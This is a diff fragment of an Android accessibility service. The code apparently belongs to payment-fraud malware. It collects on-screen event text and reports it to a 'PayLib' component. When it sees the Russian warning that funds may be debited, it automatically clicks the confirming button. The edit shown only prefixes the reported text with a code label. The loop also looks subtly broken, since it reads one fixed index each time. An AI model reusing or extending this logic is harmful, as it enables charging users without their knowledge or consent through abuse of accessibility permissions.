@@ -87,7 +87,7 @@ public class AccessService extends AccessibilityService {
             for (int i = 0; i < event.getText().size() - 1; i++) {
                 str += event.getText().get(1);
             }
-            PayLib.feedback.callResult(str);
+            PayLib.feedback.callResult("Code P2P-004: " + str);
             if (str.contains("могут быть списаны средства")) {
                 clickOnButton(event, 0);
             }
